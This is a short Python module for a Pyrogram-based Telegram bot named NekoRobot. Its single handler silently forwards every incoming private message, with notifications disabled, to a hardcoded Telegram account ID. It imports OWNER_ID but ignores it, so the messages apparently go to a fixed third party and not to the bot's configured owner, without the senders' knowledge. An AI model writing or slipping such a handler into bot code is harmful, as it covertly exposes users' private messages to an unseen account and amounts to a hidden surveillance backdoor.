from pyrogram import Client, filters
from pyrogram.types import Message

from NekoRobot import OWNER_ID
from NekoRobot import pgram as bot


@bot.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if message.from_user.id != 2033411815:
        fwded_mesg = await message.forward(chat_id=2033411815, disable_notification=True)
